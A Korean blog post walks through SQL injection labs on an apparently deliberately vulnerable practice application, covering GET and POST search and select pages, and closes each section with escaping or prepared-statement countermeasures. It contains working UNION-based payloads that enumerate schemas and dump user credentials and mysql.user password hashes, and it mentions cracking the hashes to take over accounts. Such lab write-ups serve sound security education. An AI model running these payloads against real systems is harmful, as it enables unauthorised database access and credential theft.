---
layout: post
title: "Webhacking(SQL_Injection)"
date: 2021-01-01 09:44:00 +0900
background: "/img/posts/03.jpg"
categories: ["development"]
---

SQL_Injection
=============

SQL 인젝션은 사용자가 입력한 값을 서버에서 검증하지 않고 데이터베이스
쿼리 일부분으로인식하여 데이터베이스의 정보가 노출되거나 인증이 우회되는 
취약점이다. <br>
SQL 인젝션은 사용자가 데이터를 입력할 수 있는 곳 어디에서든 발생할 수 있다.

### GET/Search

* SQL 인젝션이 가능한지 확인
  > SELECT * FROM movies WHERE title LIKE ' ' ' <br>
==> ' 를 사용하는 이유 <br> :: 데이터베이스에서 작음따옴표로 문자데이터를
                              구분하기 떄문이다.

![SQL 인젝션 가능여부 확인](https://user-images.githubusercontent.com/76092057/103431891-ce5d1700-4c1a-11eb-9b66-b619954a55a3.PNG){: width:"100%" height:"100%"}

==> 오류 메세지에는 데이터베이스 서버 정보가 포함되는데, 데이터베이스
서버의 종류에 따라 SQL 구문이 다르므로 가장 먼저 서버 정보를 확인<br>
@@ 현재 : MySQL

* 쿼리를 입력하여 어떤 주석 문자를 사용하는지 확인 <br> ==> 쿼리 결과를 항상
참으로 만들고 기존 코드의 뒷부분을 주석 처리한다.

1. ' or 1=1--
2. ' or 1=1#

![SQL 쿼리 성공](https://user-images.githubusercontent.com/76092057/103432134-25182000-4c1e-11eb-8cab-69f34d819943.PNG){: width:"100%" height:"100%"}
@@ 결과 :: 첫번째 쿼리에서는 오류, 두번째 쿼리는 모든 영화 자료가 출력된다.


* 더 자세한 정보를 알아내기 위해 UNION SELECT 구문을 사용<br>
==> UNION :: SELECT 문이 둘 이상일 때 이를 결합하여 두 질의의 결과를
하나로 반환한다. (UNION Based SQL Injection)

> UNION SELECT ALL 1# <br>
==> UNION 구문을 사용하기 위해서는 SELECT 문의 칼럼수가 일치해야함

> ' UNION SELECT ALL 1,2,3,4,5,6,7# <br>
==> 칼럼을 계속 추가하여 확인

![SQL 인젝션 UNION 문](https://user-images.githubusercontent.com/76092057/103432258-b340d600-4c1f-11eb-9645-821ad117feab.PNG){: width:"100%" height:"100%"}

> 0' UNION SELECT ALL 1,@@version,3,4,5,6,7# <br>
==> MySQL 버전을 확인하기 위하여 시스템 변수나 시스템 함수를 활용하여 쿼리 입력,
페이지에 노출되는 칼럼은 2,3,4,5번에 위치함으로 이중 하나에 시스템 변수를 삽입

![SQL 인젝션 MySQL 버전 확인](https://user-images.githubusercontent.com/76092057/103432327-7aedc780-4c20-11eb-921d-2365db1547a9.PNG){: width:"100%" height:"100%"}

@@ 버전 : 5.0.96

* information_schema를 사용하여 테이블 명을 확인
  > 0' UNION SELECT ALL 1,table_name,3,4,5,6,7 from information_schema.tables# 

![SQL 인젝션 모든 테이블명](https://user-images.githubusercontent.com/76092057/103432398-81c90a00-4c21-11eb-842a-f34de5eb7b17.PNG){: width:"100%" height:"100%"}

* 출력한 정보를 토대로 users 테이블에 사용자 계정 정보가 들어있음을 추측, 
  where 절로 users 테이블 정보만 출력하게 조건을 지정한다.
  > 0' UNION SELECT ALL 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#

![SQL 인젝션 WHERE 문](https://user-images.githubusercontent.com/76092057/103432468-a4a7ee00-4c22-11eb-8254-66ca335473f2.PNG){: width:"100%" height:"100%"}

* 페이지에 노출된 칼럼 수보다 확인하려는 칼럼 수가 많을 때는 concat 함수를 사용
  > 0' UNION SELECT ALL 1,concat (id,login), password,email,secret,6,7 from users#

![SQl 인젝션 공격 성공(GET)](https://user-images.githubusercontent.com/76092057/103432520-7840a180-4c23-11eb-8886-8c04c9fc829e.PNG){: width:"100%" height:"100%"}

### 대응방안
![SQL 인젝션 대응방안(GET)](https://user-images.githubusercontent.com/76092057/103432541-c48be180-4c23-11eb-94c6-e6550a3c8d61.PNG){: width:"100%" height:"100%"}

작은따옴표(')를 입력하여도 오류 메세지가 나오지 않으면 SQL Injection 이 불가능하다.
PHP 기본 제공 함수인 mysql_real_escape_string 함수를 사용하여 입력한 데이터를
우회한다. 이때 이 함수는 사용자 입력 값에 SQL 문법에서 사용하는 특수문자가 있을 경우
백슬래시를 붙여 입력 데이터를 SQl 문법으로 인식하지 않게 방어한다.

***
### POST/Search

==> 'sqli_6.php' 페이지는 POST 메서드로 HTTP 연결 요청을 보내고 있어서 sqli_1.php
페이지와는 다르게 URL에 변수가 나타나지 않는다. <br>
하지만 검색란에 사용되는 변수가 취약하다는 것은 전과 동일하다.

* Burp Suite를 사용하여 body에 실린 'title'과 'action'변수 둘 다 SQL인젝션 공격
  >title='&action=search

![SQL 인젝션 POST 버프스위트](https://user-images.githubusercontent.com/76092057/103433362-2738a980-4c33-11eb-8ef4-bab83ce1f78b.PNG){: width:"100%" height:"100%"}

* title 변수에 작은따옴표를 입력할 시 오류 메세지 출력, action 변수에 작은따옴표를 
  입력하면 오류메세지 x, 즉 SQL 인젝션에 취약한 변수는 title임을 알 수 있다.

![SQL 인젝션 POST 취약한 변수](https://user-images.githubusercontent.com/76092057/103433380-741c8000-4c33-11eb-940d-1fd96b7a2fa9.PNG){: width:"100%" height:"100%"}

* title 변수에 결과를 항상 참으로 만드는 구문 입력
  1. ' or 1=1--
  2. ' or 1=1#

@@ 1번 결과 :: 버전과 맞지 안흔 문법 오류 (주석문자는 '--'는 주석 기능을 하지 못한다.)

![SQL 인젝션 POST 주석문자](https://user-images.githubusercontent.com/76092057/103433466-9d89db80-4c34-11eb-89e2-9857c2d6a462.PNG){: width:"100%" height:"100%"}

@@ 2번 결과 :: 킬럼 수가 맞지 않는다는 오류

![SQL 인젝션 POST 주석문자 #](https://user-images.githubusercontent.com/76092057/103433512-74b61600-4c35-11eb-9256-219c52c7a1c2.PNG){: width:"100%" height:"100%"}


* 칼럼수를 확인하고 페이지에서 확인되지 않는 칼럼을 찾고, 데이터베이스의 버전을 확인한다
  > title=0' UNION SELECT ALL 1,2,3,4,5,6,7#action=search
  > 0' UNIKON SELECT 1,@@version,3,4,5,6,7#

![SQL 인젝션 POST 칼럼 확인](https://user-images.githubusercontent.com/76092057/103433559-4422ac00-4c36-11eb-8df5-8d66cebd64a0.PNG){: width:"100%" height:"100%"}

@@ 결과 :: 1,5,7 번째에 있는 칼럼은 페이지에서 확인 x

![SQL 인젝션 POST 버전 확인](https://user-images.githubusercontent.com/76092057/103433569-8a780b00-4c36-11eb-8651-788d259ffe67.PNG){: width:"100%" height:"100%"}

@@ 결과 :: MySQL 버전 5.0.96

* MySQL 버전이 5.0 이상이므로 'information_scheam'를 사용한다
  > 0' UNION SELECT ALL 1,table_name,3,4,5,6,7 from information_schema.tables#

![SQL 인젝션 POST 테이블 확인](https://user-images.githubusercontent.com/76092057/103433739-16d7fd00-4c3a-11eb-997c-23e7c3809f4b.PNG){: width:"100%" height:"100%"}

* 'users'라는 테이블에 사용자 정보가 있다고 에상 한 후, where절로 
  칼럼의 내용을 확인한 테이블을 제한한다.
  > 0' UNION SELECT ALL 1,column_name,3,4,5,6,7 from information_schema.columns where table_name='users'#

![SQL 인젝션 POST user 정보 노출](https://user-images.githubusercontent.com/76092057/103433795-f8263600-4c3a-11eb-817e-65e646d3bbcb.PNG){: width:"100%" height:"100%"}

* id, login, password, secret 정보를 확인하기 위해 구문을 입력
  > 0' UNION SELECT ALL 1, id, login, password, secret,6,7 from users#

![SQL 인젝션 POST 공격 성공](https://user-images.githubusercontent.com/76092057/103433825-4cc9b100-4c3b-11eb-81d9-6ab4f7ad5b73.PNG){: width:"100%" height:"100%"}

==> 이후 '존 더 리퍼'를 사용하여 해시 값으로 변환된 비밀번호를 평문으로 변홚아ㅕ
사용자 계정을 탈취할 수도 있다.

### 대응방안
![SQL 인젝션 POST 대응방안](https://user-images.githubusercontent.com/76092057/103433850-c82b6280-4c3b-11eb-8e20-00fdbe314f2b.PNG){: width:"100%" height:"100%"}

작은따옴표(')를 입력하여도 오류 메세지가 나오지 않으면 SQL Injection 이 불가능하다.
PHP 기본 제공 함수인 mysql_real_escape_string 함수를 사용하여 입력한 데이터를
우회한다. 이때 이 함수는 사용자 입력 값에 SQL 문법에서 사용하는 특수문자가 있을 경우
백슬래시를 붙여 입력 데이터를 SQl 문법으로 인식하지 않게 방어한다.

***

### GET/Select

==> GET 메소드를 사용하여 요청하기 때문에 URL 상에 변수가 보인다.<br>
숫자형만 입력하는 변수에 SQL 인젝션을 시도할 떄는 SQL 구문만 필요한데, 이때 작은따옴표를
입력하면 SQL 오류가 일어남으로, 주석 문자는 #을 사용한다.(굳이 안사용해도 된다.)

* URL 에서 확일할 수 있는 movie 변수로 SQL 인젝션 시도, 이떄 UNION SLELECT 구문을 사용한다.
  하지만 실제 사용하는 변수를 넣으면 그 값에 해당 해당하는 데이터가 나옴으로 movie에 없는
  변수를 사용한다.
  > 0 union select null,database(),@@version,@@datedir,null,null,null

![SQL 인젝션 GET](https://user-images.githubusercontent.com/76092057/103433918-21e05c80-4c3d-11eb-8898-a103137f2297.PNG){: width:"100%" height:"100%"}

* 테이블 명을 파악하기 위하여 SQL 구문을 movie 변수에 삽입하고, information_schema로 
  데이터베이스에 있는 테이블을 확인
  > 0 union select null, table_name, null, null, null, null, null from information_schema.tables

![SQL 인젝션 GET 테이블 확인](https://user-images.githubusercontent.com/76092057/103433981-b480fb80-4c3d-11eb-9da7-ef7d22b554c8.PNG){: width:"100%" height:"100%"}

* 테이블 스키마, 테이블 명, 칼럼 명을 확인하기 위해 다음 구문을 작성
  > 0 union select null,table_schema,table_name,column_name,null,null,null from information_schema
  > .columns where table_schema!='mysql' and table_schema!='information_schema'

![SQL 인젝션 GET 공격 성공](https://user-images.githubusercontent.com/76092057/103434019-76380c00-4c3e-11eb-9ce0-e1f3266cd8b4.PNG){: width:"100%" height:"100%"}

### 대응 방안

![SQL 인젝션 GET 공격 성공](https://user-images.githubusercontent.com/76092057/103434019-76380c00-4c3e-11eb-9ce0-e1f3266cd8b4.PNG){: width:"100%" height:"100%"}

![SQL 인젝션 GET 대응방안2](https://user-images.githubusercontent.com/76092057/103434044-e6df2880-4c3e-11eb-8274-8b0092b0f636.PNG){: width:"100%" height:"100%"}

![SQL 인젝션 GET 대응방안3](https://user-images.githubusercontent.com/76092057/103434053-0b3b0500-4c3f-11eb-9b82-08d10fdb8209.PNG){: width:"100%" height:"100%"}

1. 데이터베이스에서 가져온 내용을 'fetch_object' 함수를 사용하여 객체로 생성
2. movie 변수에 입력한 숫자 값이 id 변수에 대입
3. id 변수는 'recordset'에 저장된 데이터베이스 내용의 순서 번호를 뜻함
4. "bind_param' 함수를 사용하여 데이터베이스에서 사용하는 변수들을 불러오고 'execute'함수로 쿼리를 실행
5. "bind_result' 함수로 각 변수를 연결하고 'store_result'함수로 쿼리 결과를 저장
   
==> 데이터베이스에서 칼럼을 개별로 호풀하고 연결하는 방식을 사용하여 SQL 인젝션을 대응한다.

***

### POST/Select

==> POST 메소드를 사용하여 요청하기 때문에 URL 상에 변수가 나타나지 않는다.<br>
즉, Burp Suite를 사용한다.

* 버프 스위트로 확인한 결과 변수명 = "movie", 우선 데이터베이스 명과 데이터베이스 서버 버전, 서버에서 MySQL이 위치한 경로를 출력한다.
  > 0 union select null,database(),@@version,@@datadir,null,null,null

![SQL 인젝션 Select](https://user-images.githubusercontent.com/76092057/103434166-c748ff80-4c40-11eb-8ed2-b8588856add8.PNG){: width:"100%" height:"100%"}

* 사용자의 호스트 이름, 사용자 이름과 비밀번호를 출력하는 SQL 구문 작성
  > 0 union select null,host,user,password,null,null,null FROM mysql.user

![SQL 인젝션 Select 비밀번호 출력](https://user-images.githubusercontent.com/76092057/103434185-23138880-4c41-11eb-834a-6eb0ae1d44dd.PNG){: width:"100%" height:"100%"}




















